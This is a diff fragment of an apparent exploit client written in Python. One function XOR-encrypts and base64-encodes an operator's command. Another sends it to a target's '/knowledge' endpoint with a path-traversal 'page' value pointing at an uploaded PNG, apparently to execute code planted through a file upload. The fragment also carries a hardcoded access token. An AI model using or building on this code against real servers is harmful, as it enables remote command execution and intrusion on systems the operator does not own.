@@ -37,7 +37,7 @@ def get_user_command():
     return base64_encode(xor_bytes(command.encode('utf-8'), key))
 
 def send_command(command, url, png_name):
-    full_url = url
+    full_url = f"{url}/knowledge"
     payload = {
         "page": f"../../public/uploads/{png_name}",
         "token": "a646697405a18511bbe5a9b9e1872753eb4dcfa4",  
